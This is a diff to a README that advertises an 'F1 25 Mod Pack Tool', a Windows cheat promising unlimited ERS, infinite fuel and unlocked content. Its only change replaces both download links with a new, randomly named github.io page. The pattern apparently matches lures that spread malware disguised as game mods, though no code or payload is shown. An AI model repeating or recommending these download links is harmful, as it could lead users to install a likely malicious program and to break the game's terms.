@@ -2,7 +2,7 @@
 
 F1 25 Mod Pack Tool is a comprehensive Windows desktop application that allows you to enhance your F1 25 racing experience with various mods. This tool provides features such as unlimited ERS, infinite fuel, and the ability to unlock all content in the game. Designed for the 2026 season, it ensures compatibility with the latest updates and offers a user-friendly interface for seamless integration.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -68,7 +68,7 @@ Currently, the tool is optimized exclusively for F1 25. Support for other titles
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Disclaimer
 
